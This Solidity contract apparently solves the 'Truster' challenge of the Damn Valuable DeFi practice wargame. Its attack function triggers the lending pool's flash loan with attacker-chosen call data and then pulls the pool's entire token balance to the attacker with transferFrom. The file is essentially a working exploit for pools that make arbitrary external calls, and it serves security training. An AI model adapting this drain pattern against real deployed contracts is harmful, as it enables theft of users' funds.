// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "./console.sol";
import "../DamnValuableToken.sol";

contract TrusterAttack {
    TrusterLenderPool public trusterContract;
    DamnValuableToken public token;
    uint256 balanceToSteal;

    constructor(address _trusterContract, address _token) {
        trusterContract = TrusterLenderPool(_trusterContract);
        token = DamnValuableToken(_token);
    }

    // function withdraw() public returns (bool success) {
    //     console.log("withdraw func -msg.sender: ", msg.sender);
    //     console.log(
    //         "current balance of account: ",
    //         token.balanceOf(address(this))
    //     );
    //     payable(msg.sender).transfer(balanceToSteal);
    //     return true;
    // }

    function attack(
        uint256 borrowAmount,
        address borrower, //attacker  address
        address target,
        bytes calldata data
    ) public returns (bool) {
        console.log("attack func -msg.sender: ", msg.sender);

        balanceToSteal = token.balanceOf(address(trusterContract));
        TrusterLenderPool(trusterContract).flashLoan(
            borrowAmount,
            borrower,
            target,
            data
        );
        token.transferFrom(address(trusterContract), borrower, balanceToSteal);
        console.log("sent the flashloan to the truster contract");
    }
}
